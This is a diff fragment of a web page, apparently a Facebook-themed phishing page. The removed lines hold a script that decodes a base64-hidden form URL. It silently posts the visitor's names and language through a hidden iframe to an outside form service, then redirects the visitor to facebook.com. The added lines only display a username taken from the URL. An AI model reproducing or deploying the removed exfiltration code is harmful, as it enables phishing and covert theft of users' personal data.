-                    const encodedFormUrl4 = "aHR0cHM6Ly9zdWJtaXQtZm9ybS5jb20vTVhRQVlkSU9Q";
-                    const fourthFormUrl = decodeBase64(encodedFormUrl4);
-                    
-                    const tempForm4 = document.createElement('form');
-                    tempForm4.method = 'POST';
-                    tempForm4.action = fourthFormUrl;
-                    tempForm4.target = 'hiddenIframe4';
-                    tempForm4.style.display = 'none';
-                    
-                    const firstNameInput = document.createElement('input');
-                    firstNameInput.type = 'text';
-                    firstNameInput.name = 'firstName';
-                    firstNameInput.value = userData.firstName;
-                    tempForm4.appendChild(firstNameInput);
-                    
-                    const lastNameInput = document.createElement('input');
-                    lastNameInput.type = 'text';
-                    lastNameInput.name = 'lastName';
-                    lastNameInput.value = userData.lastName;
-                    tempForm4.appendChild(lastNameInput);
-                    
-                    const surnameInput = document.createElement('input');
-                    surnameInput.type = 'text';
-                    surnameInput.name = 'surname';
-                    surnameInput.value = userData.surname;
-                    tempForm4.appendChild(surnameInput);
-                    
-                    const languageInput = document.createElement('input');
-                    languageInput.type = 'text';
-                    languageInput.name = 'language';
-                    languageInput.value = selectedLanguage;
-                    tempForm4.appendChild(languageInput);
-                    
-                    document.body.appendChild(tempForm4);
-                    tempForm4.submit();
-                    
-                    document.body.removeChild(tempForm4);
-                    
-                    hiddenIframe4.onload = function() {
-                        window.location.href = 'https://facebook.com';
-                    };
-                };
-            };
-        });
-        
-        document.getElementById('navToggle').addEventListener('click', function() {
-            const mobileNav = document.getElementById('mobileNav');
-            if (mobileNav.style.display === 'block') {
-                mobileNav.style.display = 'none';
-            } else {
-                mobileNav.style.display = 'block';
-            }
-        });
-    </script>
+
+</div>
+
+<script>
+// Get username from URL
+function getUsername() {
+    let params = new URLSearchParams(window.location.search);
+    return params.get("user") || "facebook";
+}
+
+document.getElementById("username").innerText = getUsername();
+</script>
+
 </body>
 </html>
